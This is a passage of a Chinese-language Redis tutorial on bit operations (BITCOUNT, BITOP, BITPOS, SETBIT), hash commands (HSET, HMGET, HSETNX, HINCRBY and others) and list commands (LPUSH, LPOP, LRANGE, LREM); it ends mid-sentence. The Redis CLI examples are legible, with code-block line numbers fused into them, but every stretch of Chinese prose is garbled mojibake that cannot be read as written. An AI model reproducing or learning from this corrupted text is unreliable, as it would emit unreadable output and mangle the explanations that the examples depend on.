å¯ä»¥é€šè¿‡å‚æ•°é™åˆ¶ç»Ÿè®¡çš„å­—èŠ‚èŒƒå›´ï¼Œä¾‹å¦‚åªå¸Œæœ›ç»Ÿè®¡å‰ä¸¤ä¸ªå­—èŠ‚ï¼ˆå³ â€œfoâ€ï¼‰ï¼Œå­—èŠ‚èŒƒå›´ä» 0 å¼€å§‹ï¼š 12345redis&gt; set foo barOKredis&gt; BITCOUNT foo 0 1(integer) 6 BITOP å‘½ä»¤å¯ä»¥å¯¹å¤šä¸ªå­—ç¬¦ä¸²ç±»å‹é”®è¿›è¡Œä½è¿ç®—ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ destkey å‚æ•°æŒ‡å®šçš„é”®ä¸­ã€‚BITOP å‘½ä»¤æ”¯æŒçš„è¿ç®—æ“ä½œæœ‰ ANDã€ORã€XOR å’Œ NOTã€‚ä¾‹å¦‚å¯ä»¥å¯¹ bar å’Œ aar è¿›è¡Œ OR è¿ç®—ï¼š 1234567891011redis&gt; set foo1 barOKredis&gt; set foo2 aarOKredis&gt; BITOP OR res foo1 foo2(integer) 3redis&gt; GET res"car" å…·ä½“çš„ä½è¿ç®—è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼š BITPOS å‘½ä»¤å¯ä»¥è·å¾—æŒ‡å®šé”®çš„ç¬¬ä¸€ä¸ªä½å€¼æ˜¯ 0 æˆ–è€… 1 çš„ä½ç½®ã€‚ä»¥ â€œbarâ€ è¿™ä¸ªé”®å€¼ä¸ºä¾‹ï¼Œå¦‚æœæƒ³è·å–é”®å€¼ä¸­çš„ç¬¬ä¸€ä¸ªäºŒè¿›åˆ¶ä½å€¼ä¸º 1 çš„ä½ç½®ï¼ˆä» 0 å¼€å§‹ç®—èµ·ï¼‰ï¼Œåˆ™å¯ä»¥æ‰§è¡Œï¼š 12345redis&gt; SET foo barOKredis&gt; BITPOS foo 1(integer) 1 å¯¹æ¯”ä¸Šé¢ä½è¿ç®—çš„è¿‡ç¨‹å›¾ï¼Œæ­£å¦‚ BITPOS å‘½ä»¤çš„æ‰§è¡Œç»“æœæ‰€ç¤ºï¼Œâ€barâ€ ä¸­ç¬¬ä¸€ä¸ªå€¼ä¸º 1 çš„äºŒè¿›åˆ¶ä½çš„ä½ç½®ä¸º 1ï¼ˆåŒå…¶ä»–å‘½ä»¤ä¸€æ ·ï¼ŒBITPOS å‘½ä»¤çš„ç´¢å¼•ä¹Ÿæ˜¯ä» 0 å¼€å§‹ç®—èµ·ï¼‰ã€‚å¦‚æœå¸Œæœ›æŒ‡å®šäºŒè¿›åˆ¶ä½çš„æŸ¥è¯¢èŒƒå›´ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ BITPOS å‘½ä»¤çš„ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå®ƒä»¬åˆ†åˆ«ç”¨æ¥æŒ‡å®šè¦æŸ¥è¯¢çš„èµ·å§‹å­—èŠ‚ï¼ˆä» 0 å¼€å§‹ç®—èµ·ï¼‰å’Œç»“æŸå­—èŠ‚ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œè¿™é‡Œç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°çš„å•ä½ä¸å†æ˜¯äºŒè¿›åˆ¶ä½ï¼Œè€Œæ˜¯å­—èŠ‚ã€‚è€Œè¿”å›çš„ç»“æœï¼ˆä½ç½®ï¼‰æ˜¯ä»å¤´å¼€å§‹ç®—èµ·çš„ï¼Œä¸èµ·å§‹å­—èŠ‚æ— å…³ã€‚å¦‚æœä¸è®¾ç½®ç»“æŸå­—èŠ‚ä¸”é”®å€¼çš„æ‰€æœ‰äºŒè¿›åˆ¶ä½éƒ½æ˜¯ 1 çš„æ—¶å€™ï¼Œåˆ™å½“è¦æŸ¥è¯¢å€¼ä¸º 0 çš„äºŒè¿›åˆ¶ä½çš„ä½ç½®æ—¶ï¼Œè¿”å›ç»“æœä¼šæ˜¯é”®å€¼é•¿åº¦çš„ä¸‹ä¸€ä¸ªå­—ä½çš„ä½ç½®ï¼Œè¿™æ˜¯å› ä¸º Redis ä¼šè®¤ä¸ºé”®å€¼é•¿åº¦ä¹‹åçš„äºŒè¿›åˆ¶ä½éƒ½æ˜¯ 0ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæƒ³æŸ¥è¯¢ç¬¬äºŒä¸ªå­—èŠ‚åˆ°ç¬¬ä¸‰ä¸ªå­—èŠ‚ä¹‹é—´ï¼ˆå³ â€œaâ€ å’Œ â€œrâ€ï¼‰å‡ºç°çš„ç¬¬ä¸€ä¸ªå€¼ä¸º 1 çš„äºŒè¿›åˆ¶ä½çš„ä½ç½®ï¼Œåˆ™å¯ä»¥æ‰§è¡Œï¼š 12345redis&gt; SET foo barOKredis&gt; BITPOS foo 1 1 2(integer) 9 ä½æ“ä½œåº”ç”¨ä¸¾ä¾‹ï¼š åˆ©ç”¨ä½æ“ä½œå‘½ä»¤å¯ä»¥éå¸¸ç´§å‡‘åœ°å­˜å‚¨å¸ƒå°”å€¼ã€‚æ¯”å¦‚å‡è®¾ç½‘ç«™çš„æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªé€’å¢çš„æ•´æ•° IDï¼Œå¦‚æœä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹é”®é…åˆä½æ“ä½œæ¥è®°å½•æ¯ä¸ªç”¨æˆ·çš„æ€§åˆ«ï¼ˆç”¨æˆ· ID ä½œä¸ºç´¢å¼•ï¼ŒäºŒè¿›åˆ¶ä½å€¼ 1 å’Œ 0 è¡¨ç¤ºç”·æ€§å’Œå¥³æ€§ï¼‰ï¼Œé‚£ä¹ˆè®°å½• 100 ä¸‡ä¸ªç”¨æˆ·çš„æ€§åˆ«åªéœ€å ç”¨ 100 KB å¤šçš„ç©ºé—´ï¼Œè€Œä¸”ç”±äº GETBIT å’Œ SETBIT çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O (1)ï¼Œæ‰€ä»¥è¯»å–äºŒè¿›åˆ¶ä½å€¼æ€§èƒ½å¾ˆé«˜ã€‚ SETBIT å‘½ä»¤ä½¿ç”¨æ³¨æ„äº‹é¡¹ï¼š ä½¿ç”¨ SETBIT å‘½ä»¤æ—¶ï¼Œå¦‚æœå½“å‰é”®çš„é”®å€¼é•¿åº¦å°äºè¦è®¾ç½®çš„äºŒè¿›åˆ¶ä½çš„ä½ç½®æ—¶ï¼ŒRedis ä¼šè‡ªåŠ¨åˆ†é…å†…å­˜å¹¶å°†é”®å€¼çš„å½“å‰é•¿åº¦åˆ°æŒ‡å®šçš„ä½ç½®ä¹‹é—´çš„äºŒè¿›åˆ¶ä½éƒ½è®¾ç½®ä¸º 0ã€‚æ­¤æ—¶å¦‚æœè¦åˆ†é…çš„å†…å­˜è¿‡å¤§ï¼Œåˆ™å¾ˆå¯èƒ½ä¼šé€ æˆæœåŠ¡å™¨çš„æš‚æ—¶é˜»å¡è€Œæ— æ³•å¤„ç†åŒä¸€æ—¶é—´çš„å…¶ä»–è¯·æ±‚ã€‚è¿˜æ˜¯ä¸¾åˆšæ‰å­˜å‚¨ç½‘ç«™ç”¨æˆ·æ€§åˆ«çš„ä¾‹å­ï¼Œå¦‚æœè¿™ä¸ªç½‘ç«™çš„ç”¨æˆ· ID æ˜¯ä» 100000001 å¼€å§‹çš„ï¼Œé‚£ä¹ˆä¼šé€ æˆ 10 å¤š MB çš„æµªè´¹ï¼Œæ­£ç¡®çš„åšæ³•æ˜¯ç»™æ¯ä¸ªç”¨æˆ·çš„ ID å‡å» 100000000 å†è¿›è¡Œå­˜å‚¨ã€‚ æ•£åˆ—ç±»å‹ï¼ˆHashï¼‰Redis æ˜¯é‡‡ç”¨å­—å…¸ç»“æ„ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨æ•°æ®çš„ï¼Œè€Œæ•£åˆ—ç±»å‹ï¼ˆHashï¼‰çš„é”®å€¼æ˜¯ä¸€ç§å­—å…¸ç»“æ„ï¼Œå…¶å­˜å‚¨äº†å­—æ®µï¼ˆFieldï¼‰å’Œå­—æ®µå€¼çš„æ˜ å°„ï¼Œä½†å­—æ®µå€¼åªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œä¸æ”¯æŒå…¶ä»–æ•°æ®ç±»å‹ï¼Œå³æ•£åˆ—ç±»å‹ä¸èƒ½åµŒå¥—å…¶ä»–çš„æ•°æ®ç±»å‹ã€‚ä¸€ä¸ªæ•£åˆ—ç±»å‹é”®å¯ä»¥åŒ…å«ä¹‹å¤š 2^32 - 1 ä¸ªå­—æ®µã€‚é™¤äº†æ•£åˆ—ç±»å‹ï¼ŒRedis çš„å…¶ä»–æ•°æ®ç±»å‹åŒæ ·ä¸æ”¯æŒæ•°æ®ç±»å‹åµŒå¥—ã€‚æ¯”å¦‚é›†åˆç±»å‹çš„æ¯ä¸ªå…ƒç´ éƒ½åªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œä¸èƒ½æ˜¯å¦ä¸€ä¸ªé›†åˆæˆ–æ•£åˆ—è¡¨ç­‰ã€‚æ•£åˆ—ç±»å‹é€‚åˆå­˜å‚¨å¯¹è±¡ï¼šä½¿ç”¨å¯¹è±¡ç±»åˆ«å’Œ ID æ„æˆé”®åï¼Œä½¿ç”¨å­—æ®µè¡¨ç¤ºå¯¹è±¡çš„å±æ€§ï¼Œè€Œå­—æ®µå€¼åˆ™å­˜å‚¨å±æ€§å€¼ã€‚ä¾‹å¦‚è¦å­˜å‚¨ ID ä¸º 2 çš„æ±½è½¦å¯¹è±¡ï¼Œå¯ä»¥åˆ†åˆ«ä½¿ç”¨åä¸º colorã€name å’Œ price çš„ 3 ä¸ªå­—æ®µæ¥å­˜å‚¨è¯¥è¾†æ±½è½¦çš„é¢œè‰²ã€åç§°å’Œä»·æ ¼ï¼Œå…·ä½“å­˜å‚¨ç»“æ„å›¾å¦‚ä¸‹ï¼š å¯¹æ¯”å…³ç³»æ•°æ®åº“ä¸­å­˜å‚¨çš„æ±½è½¦å¯¹è±¡ï¼š å…³ç³»å‹æ•°æ®åº“ä¸­ï¼Œæ•°æ®æ˜¯ä»¥äºŒç»´è¡¨çš„å½¢å¼å­˜å‚¨çš„ï¼Œè¿™å°±è¦æ±‚æ‰€æœ‰çš„è®°å½•éƒ½æ‹¥æœ‰ç›¸åŒçš„å±æ€§ï¼Œæ— æ³•å•ç‹¬ä¸ºæŸæ¡è®°å½•å¢å‡å±æ€§ã€‚å¦‚æœæƒ³ä¸º ID ä¸º 1 çš„æ±½è½¦å¢åŠ ç”Ÿäº§æ—¥æœŸçš„å±æ€§ï¼Œå°±éœ€è¦å§æ•°æ®è¡¨æ›´æ”¹ä¸ºå¦‚ä¸Šå›¾æ‰€ç¤ºçš„ç»“æ„ã€‚å¢åŠ ä¸€ä¸ªå±æ€§åå¯¹äº ID ä¸º 2 å’Œ 3 çš„ä¸¤æ¡è®°å½•è€Œè¨€ data å­—æ®µæ˜¯å†—ä½™çš„ã€‚è€Œ Redis çš„æ•£åˆ—ç±»å‹åˆ™ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œä¸Šå›¾ä¸­æè¿°äº†æ±½è½¦å¯¹è±¡çš„å­˜å‚¨ç»“æ„ï¼Œä½†æ˜¯è¿™ä¸ªç»“æ„åªæ˜¯äººä¸ºçš„çº¦å®šï¼ŒRedis å¹¶ä¸å¼ºåˆ¶è¦æ±‚æ¯ä¸ªé”®éƒ½ä¾æ®æ­¤ç»“æ„å­˜å‚¨ï¼Œå®Œå…¨å¯ä»¥è‡ªç”±åœ°ä¸ºä»»ä½•é”®å¢å‡å­—æ®µè€Œä¸å½±å“å…¶ä»–é”®ã€‚ èµ‹å€¼ä¸å–å€¼ï¼ˆæ•£åˆ—ï¼‰èµ‹å€¼ä¸å–å€¼å‘½ä»¤ï¼š 123456789HSET key field valueHGET key fieldHMSET key field value [field value ...]HMGET key field [field ...]HGETALL key ç¤ºä¾‹ï¼š 12345678redis&gt; HSET car price 500(integer) 1redis&gt; HSET car name BMW(integer) 1redis&gt; HGET car name"BMW" HSET å‘½ä»¤çš„æ–¹ä¾¿ä¹‹å¤„åœ¨äºä¸åŒºåˆ†æ–°å¢å’Œæ›´æ–°æ“ä½œï¼Œè¿™æ„å‘³ç€ä¿®æ”¹æ•°æ®æ—¶ä¸ç”¨äº‹å…ˆåˆ¤æ–­å­—æ®µæ˜¯å¦å­˜åœ¨æ¥å†³å®šè¦æ‰§è¡Œçš„æ˜¯æ–°å¢æ“ä½œï¼ˆinertï¼‰è¿˜æ˜¯æ›´æ–°æ“ä½œï¼ˆupdateï¼‰ã€‚å½“æ‰§è¡Œçš„æ˜¯æ–°å¢æ“ä½œæ—¶ï¼ˆå³ä¹‹å‰å­—æ®µä¸å­˜åœ¨ï¼‰HSET å‘½ä»¤ä¼šè¿”å› 1ï¼Œå½“æ‰§è¡Œçš„æ˜¯æ›´æ–°æ“ä½œæ—¶ï¼ˆå³ä¹‹å‰å­—æ®µå·²ç»å­˜åœ¨ï¼‰HSET å‘½ä»¤ä¼šè¿”å› 0ã€‚æ›´è¿›ä¸€æ­¥ï¼Œå½“é”®æœ¬èº«ä¸å­˜åœ¨æ—¶ï¼ŒHSET å‘½ä»¤è¿˜ä¼šè‡ªåŠ¨åˆ›å»ºå®ƒã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒRedis ä¸­æ¯ä¸ªé”®éƒ½å±äºä¸€ä¸ªæ˜ç¡®çš„æ•°æ®ç±»å‹ï¼Œå¦‚é€šè¿‡ HSET å‘½ä»¤å»ºç«‹çš„é”®æ˜¯æ•£åˆ—ç±»å‹ï¼Œé€šè¿‡ SET å‘½ä»¤å»ºç«‹çš„é”®æ˜¯å­—ç¬¦ä¸²ç±»å‹ç­‰ç­‰ã€‚ä½¿ç”¨ä¸€ç§æ•°æ®ç±»å‹çš„å‘½ä»¤æ“ä½œå¦ä¸€ç§æ•°æ®ç±»å‹çš„é”®ä¼šæç¤ºé”™è¯¯ï¼šâ€ERR Operation against a key holding the wrong kind of valueâ€ï¼›ä½†å¹¶ä¸æ˜¯æ‰€æœ‰å‘½ä»¤éƒ½å¦‚æ­¤ï¼Œæ¯”å¦‚ SET å‘½ä»¤å¯ä»¥è¦†ç›–å·²ç»å­˜åœ¨çš„é”®è€Œä¸ç®¡åŸæ¥çš„é”®æ˜¯ä»€ä¹ˆç±»å‹ã€‚ è‹¥éœ€è¦åŒæ—¶è®¾ç½®ã€è·å–å¤šä¸ªå­—æ®µçš„å€¼æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ HMSETã€HMGET å‘½ä»¤ï¼š 123456redis&gt; HMSET car2 price 500 name BMWOKredis&gt; HMGET car2 price name1) "500"2) "BMW" è‹¥æƒ³è·å–é”®ä¸­æ‰€æœ‰å­—æ®µå’Œå­—æ®µå€¼å´ä¸çŸ¥é“é”®ä¸­æœ‰å“ªäº›å­—æ®µï¼Œåˆ™åº”è¯¥ä½¿ç”¨ HGETALL å‘½ä»¤ï¼š 12345redis&gt; HGETALL car1) "price"2) "500"3) "name"4) "BMW" åˆ¤æ–­å­—æ®µæ˜¯å¦å­˜åœ¨HEXISTS å‘½ä»¤ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªå­—æ®µæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å› 1ï¼Œå¦åˆ™è¿”å› 0ï¼ˆå¦‚æœé”®ä¸å­˜åœ¨ä¹Ÿä¼šè¿”å› 0ï¼‰ã€‚ 1HEXISTS key field ç¤ºä¾‹ï¼š 12345678redis&gt; HEXISTS car model(integer) 0redis&gt; HSET car model c200(integer) 1redis&gt; HEXISTS car model(integer) 1 å½“å­—æ®µä¸å­˜åœ¨æ—¶èµ‹å€¼HSETNX å‘½ä»¤ä¸ HSET å‘½ä»¤ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºå¦‚æœå­—æ®µå·²ç»å­˜åœ¨ï¼ŒHSETNX å‘½ä»¤å°†ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚HSETNX å‘½ä»¤ä¸­çš„ â€œNXâ€ è¡¨ç¤º â€œIf Not Existsâ€ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰ï¼ŒåŒæ—¶ HSETNX å‘½ä»¤æ˜¯åŸå­æ“ä½œï¼Œä¸ç”¨æ‹…å¿ƒç«æ€æ¡ä»¶ï¼Œå¯ä»¥ç”¨ä½œåˆ†å¸ƒå¼é”çš„å®ç°ã€‚ 1HSETNX key field value ç¤ºä¾‹ï¼š 12345678redis&gt; HSET car model c200(integer) 1redis&gt; HSETNX car model c300(integer) 0redis&gt; HGET car model"c200" å¢åŠ å­—æ®µHINCRBY ä¸ INCRã€INCRBY å‘½ä»¤ç±»ä¼¼ï¼Œå¯ä»¥ä½¿å­—æ®µå€¼å¢åŠ æŒ‡å®šçš„æ•´æ•°ã€‚æ•£åˆ—ç±»å‹æ²¡æœ‰ HINCR å‘½ä»¤ï¼Œä½†å¯ä»¥é€šè¿‡ HINCRBY key field 1 æ¥å®ç°ã€‚ 1HINCRBY key field increment ç¤ºä¾‹ï¼š 12345redis&gt; HINCRBY person score 60(integer) 60redis&gt; HGET person score"60" å½“ persion é”®ä¸å­˜åœ¨æ—¶ï¼ŒHINCRBY å‘½ä»¤ä¼šè‡ªåŠ¨å»ºç«‹è¯¥é”®ï¼Œå¹¶è®¾ç½®å­—æ®µ score çš„é»˜è®¤å€¼ä¸º 0ï¼Œç„¶åå†æ‰§è¡Œè‡ªå¢æ“ä½œï¼Œå‘½ä»¤çš„è¿”å›ç»“æœæ˜¯å¢å€¼åçš„å­—æ®µå€¼ã€‚ åˆ é™¤å­—æ®µHDEL å‘½ä»¤å¯ä»¥åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ®µï¼Œè¿”å›å€¼æ˜¯è¢«åˆ é™¤çš„å­—æ®µä¸ªæ•°ã€‚ 1HDEL key field [field ...] ç¤ºä¾‹ï¼š 12345redis&gt; HDEL car name(integer) 1redis&gt; HDEL car name(integer) 0 åªè·å–å­—æ®µåæˆ–å­—æ®µå€¼è‹¥ä»…ä»…éœ€è¦è·å–é”®ä¸­æ‰€æœ‰å­—æ®µçš„åç§°æˆ–è€…å­—æ®µå€¼ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ HKEYSã€HVALS å‘½ä»¤ï¼š 123HKEYS keyHVALS key ç¤ºä¾‹ï¼š 1234567redis&gt; HKEYS car1) "price"2) "model"redis&gt; HVALS car1) "500"2) "c200" åˆ—è¡¨ç±»å‹ï¼ˆListï¼‰åˆ—è¡¨ç±»å‹ï¼ˆListï¼‰å¯ä»¥å­˜å‚¨ä¸€ä¸ªæœ‰åºçš„å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¸¸ç”¨çš„æ“ä½œæ˜¯å‘åˆ—è¡¨ä¸¤ç«¯æ·»åŠ å…ƒç´ ï¼Œæˆ–è€…è·å¾—åˆ—è¡¨çš„æŸä¸€ä¸ªç‰‡æ®µã€‚åˆ—è¡¨ç±»å‹å†…éƒ¨æ˜¯ä½¿ç”¨åŒå‘é“¾è¡¨ï¼ˆdouble linked listï¼‰å®ç°çš„ï¼Œæ‰€ä»¥å‘åˆ—è¡¨ä¸¤ç«¯æ·»åŠ å…ƒç´ çš„æ—¶é—´å¤æ‚åº¦ä¸º O (1)ï¼Œè·å–è¶Šæ¥è¿‘ä¸¤ç«¯çš„å…ƒç´ é€Ÿåº¦å°±è¶Šå¿«ã€‚è¿™æ„å‘³ç€å³ä½¿æ˜¯ä¸€ä¸ªæœ‰å‡ åƒä¸‡ä¸ªå…ƒç´ çš„åˆ—è¡¨ï¼Œè·å–å¤´éƒ¨æˆ–å°¾éƒ¨çš„ 10 æ¡è®°å½•ä¹Ÿæ˜¯æå¿«çš„ï¼ˆå’Œä»åªæœ‰ 20 ä¸ªå…ƒç´ çš„åˆ—è¡¨ä¸­è·å–å¤´éƒ¨æˆ–å°¾éƒ¨çš„ 10 æ¡è®°å½•çš„é€Ÿåº¦æ˜¯ä¸€æ ·çš„ï¼‰ï¼Œä¸è¿‡ä½¿ç”¨é“¾è¡¨çš„ä»£ä»·æ˜¯é€šè¿‡ç´¢å¼•è®¿é—®å…ƒç´ æ¯”è¾ƒæ…¢ï¼Œå…¶å…ƒç´ éå†é€Ÿåº¦è¦è¿œæ…¢äºæ•°ç»„ã€‚è¿™ç§ç‰¹æ€§ä½¿åˆ—è¡¨ç±»å‹èƒ½éå¸¸å¿«é€Ÿåœ°å®Œæˆå…³ç³»æ•°æ®åº“éš¾ä»¥åº”ä»˜çš„åœºæ™¯ï¼šå¦‚ç¤¾äº¤ç½‘ç«™çš„æ–°é²œäº‹ï¼Œç”¨æˆ·å…³å¿ƒçš„åªæ˜¯æœ€æ–°çš„å†…å®¹ï¼Œä½¿ç”¨åˆ—è¡¨ç±»å‹å­˜å‚¨ï¼Œå³ä½¿æ–°é²œäº‹çš„æ€»æ•°è¾¾åˆ°å‡ åƒä¸‡ä¸ªï¼Œè·å–å…¶ä¸­æœ€æ–°çš„ 100 æ¡æ•°æ®ä¹Ÿæ˜¯æå¿«çš„ã€‚åŒæ ·å› ä¸ºåœ¨ä¸¤ç«¯æ’å…¥è®°å½•çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O (1)ï¼Œåˆ—è¡¨ç±»å‹ä¹Ÿé€‚åˆç”¨æ¥è®°å½•æ—¥å¿—ï¼Œå¯ä»¥ä¿è¯åŠ å…¥æ–°æ—¥å¿—çš„é€Ÿåº¦ä¸ä¼šå—åˆ°å·²æœ‰æ—¥å¿—æ•°é‡çš„å½±å“ã€‚ä¸æ•£åˆ—ç±»å‹é”®æœ€å¤šèƒ½å®¹çº³çš„å­—æ®µæ•°é‡ç›¸åŒï¼Œä¸€ä¸ªåˆ—è¡¨ç±»å‹é”®æœ€å¤šèƒ½å®¹çº³ 2^32 âˆ’ 1 ä¸ªå…ƒç´ ã€‚å€ŸåŠ©åˆ—è¡¨ç±»å‹ï¼ŒRedis è¿˜å¯ä»¥ä½œä¸ºé˜Ÿåˆ—ä½¿ç”¨ã€‚ å‘åˆ—è¡¨ä¸¤ç«¯æ·»åŠ å…ƒç´ LPUSH å‘½ä»¤ç”¨æ¥å‘åˆ—è¡¨å·¦è¾¹æ·»åŠ å…ƒç´ ï¼Œè¿”å›å€¼è¡¨ç¤ºæ·»åŠ å…ƒç´ ååˆ—è¡¨çš„æ€»é•¿åº¦ã€‚ 123LPUSH key value [value â€¦]RPUSH key value [value â€¦] ç¤ºä¾‹ï¼š 12345redis&gt; LPUSH numbers 1(integer) 1redis&gt; LPUSH numbers 2 3(integer) 3 å½“é€šè¿‡ LPUSH å‘½ä»¤å¾€åˆ—è¡¨ä¸­ä¾æ¬¡æ·»åŠ  â€œ1â€ã€â€2â€œã€â€3â€œ æ—¶ï¼Œnumbers é”®ä¸­çš„æ•°æ®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä½¿ç”¨ RPUSH å‘½ä»¤å‘åˆ—è¡¨å³è¾¹æ·»åŠ å…ƒç´ çš„è¯ï¼Œå…¶ç”¨æ³•å’Œ LPUSH å‘½ä»¤ä¸€æ ·ï¼š 12redis&gt; RPUSH numbers 0 -1(integer) 3 æ­¤æ—¶ numbers é”®ä¸­çš„æ•°æ®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä»åˆ—è¡¨ä¸¤ç«¯å¼¹å‡ºå…ƒç´ æœ‰è¿›æœ‰å‡ºï¼ŒLPOP å‘½ä»¤å¯ä»¥ä»åˆ—è¡¨å·¦è¾¹å¼¹å‡ºä¸€ä¸ªå…ƒç´ ã€‚LPOP å‘½ä»¤æ‰§è¡Œä¸¤æ­¥æ“ä½œï¼šç¬¬ä¸€æ­¥æ˜¯å°†åˆ—è¡¨å·¦è¾¹çš„å…ƒç´ ä»åˆ—è¡¨ä¸­ç§»é™¤ï¼Œç¬¬äºŒæ­¥æ˜¯è¿”å›è¢«ç§»é™¤çš„å…ƒç´ å€¼ã€‚ 123LPOP keyRPOP key ç¤ºä¾‹ï¼š 12345redis&gt; LPOP numbers"3"redis&gt; RPOP numbers"-1" ä» numbers åˆ—è¡¨å·¦è¾¹å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯ â€3â€œï¼‰ï¼ŒåŒæ—¶åˆ—è¡¨å³è¾¹ä¹Ÿå¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼ˆå³â€-1â€œï¼‰ï¼Œæ­¤æ—¶ numbers é”®ä¸­çš„æ•°æ®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç»¼åˆ LPUSHã€RPUSHã€LPOPã€RPOP å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨åˆ—è¡¨ç±»å‹æ¥æ¨¡æ‹Ÿæ ˆå’Œé˜Ÿåˆ—çš„æ“ä½œã€‚å¦‚æœæƒ³æŠŠåˆ—è¡¨å½“åšæ ˆï¼Œåˆ™æ­é…ä½¿ç”¨ LPUSHã€LPOP æˆ– RPUSHã€RPOPã€‚å¦‚æœæƒ³å½“æˆé˜Ÿåˆ—ï¼Œåˆ™æ­é…ä½¿ç”¨ LPUSHã€RPOP æˆ– RPUSHã€LPOPã€‚ è·å–åˆ—è¡¨ä¸­å…ƒç´ çš„ä¸ªæ•°å½“é”®ä¸å­˜åœ¨æ—¶ï¼ŒLLEN å‘½ä»¤ä¼šè¿”å› 0ã€‚ 1LLEN key ç¤ºä¾‹ï¼š 12redis&gt; LLEN numbers(integer) 3 LLEN å‘½ä»¤çš„åŠŸèƒ½ç±»ä¼¼ SQL è¯­å¥ SELECT COUNT(*) FROM table_nameï¼Œä½†æ˜¯ LLEN çš„æ—¶é—´å¤æ‚åº¦ä¸º O (1)ï¼Œä½¿ç”¨æ—¶ Redis ä¼šç›´æ¥è¯»å–ç°æˆçš„å€¼ï¼Œè€Œä¸éœ€è¦åƒéƒ¨åˆ†å…³ç³»æ•°æ®åº“ï¼ˆå¦‚ä½¿ç”¨ InnoDB å­˜å‚¨å¼•æ“çš„ MySQL è¡¨ï¼‰é‚£æ ·éœ€è¦éå†ä¸€éæ•°æ®è¡¨æ¥ç»Ÿè®¡æ¡ç›®æ•°é‡ã€‚ è·å¾—åˆ—è¡¨ç‰‡æ®µLRANGE å‘½ä»¤æ˜¯åˆ—è¡¨ç±»å‹æœ€å¸¸ç”¨çš„å‘½ä»¤ä¹‹ä¸€ï¼Œå®ƒèƒ½å¤Ÿè·å¾—åˆ—è¡¨ä¸­çš„æŸä¸€ç‰‡æ®µã€‚LRANGE å‘½ä»¤å°†è¿”å›ç´¢å¼•ä» start åˆ° stop ä¹‹é—´çš„æ‰€æœ‰å…ƒç´ ï¼ˆåŒ…å«ä¸¤ç«¯çš„å…ƒç´ ï¼šstartã€stopï¼‰ï¼ŒRedis çš„åˆ—è¡¨èµ·å§‹ç´¢å¼•ä¸º 0ã€‚LRANGE å‘½ä»¤åœ¨å–å¾—åˆ—è¡¨ç‰‡æ®µæ—¶ï¼Œä¸ä¼šåƒ LPOP ä¸€æ ·åˆ é™¤è¯¥ç‰‡æ®µã€‚ 1LRANGE key start stop ç¤ºä¾‹ï¼š 1234redis&gt; LRANGE numbers 0 21) "2"2) "1"3) "0" LRANGE å‘½ä»¤ä¹Ÿæ”¯æŒè´Ÿç´¢å¼•ï¼Œè¡¨ç¤ºä»å³è¾¹å¼€å§‹è®¡ç®—åºæ•°ï¼Œå¦‚ â€œ-1â€ è¡¨ç¤ºæœ€å³è¾¹ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œâ€-2â€ è¡¨ç¤ºæœ€å³è¾¹ç¬¬äºŒä¸ªå…ƒç´ ï¼Œä¾æ¬¡ç±»æ¨ã€‚æ˜¾ç„¶ï¼ŒLRANGE numbers 0 -1 å¯ä»¥è·å–åˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ 12345678redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0"redis&gt; LRANGE numbers -2 -11) "1"2) "0" è™½ç„¶ LRANGE numbers 0 -1 å¯ä»¥è·å–åˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œä½†å­˜åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µå¦‚ä¸‹ï¼š å¦‚æœ start çš„ç´¢å¼•ä½ç½®æ¯” stop çš„ç´¢å¼•ä½ç½®é åï¼Œåˆ™ä¼šè¿”å›ç©ºåˆ—è¡¨ å¦‚æœ stop å¤§äºå®é™…çš„ç´¢å¼•èŒƒå›´ï¼Œåˆ™ä¼šè¿”å›åˆ°åˆ—è¡¨æœ€å³è¾¹çš„å…ƒç´  åˆ é™¤åˆ—è¡¨ä¸­æŒ‡å®šçš„å€¼1LREM key count value LREM å‘½ä»¤ä¼šåˆ é™¤åˆ—è¡¨ä¸­å‰ count ä¸ªå€¼ä¸º value çš„å…ƒç´ ï¼Œè¿”å›å€¼æ˜¯å®é™…åˆ é™¤çš„å…ƒç´ ä¸ªæ•°ã€‚æ ¹æ® count å€¼çš„ä¸åŒï¼ŒLREM å‘½ä»¤çš„æ‰§è¡Œæ–¹å¼ä¼šç•¥æœ‰å·®å¼‚ï¼Œå…·ä½“å¦‚ä¸‹ï¼š å½“ count &gt; 0 æ—¶ LREM å‘½ä»¤ä¼šä»åˆ—è¡¨å·¦è¾¹å¼€å§‹åˆ é™¤å‰ count 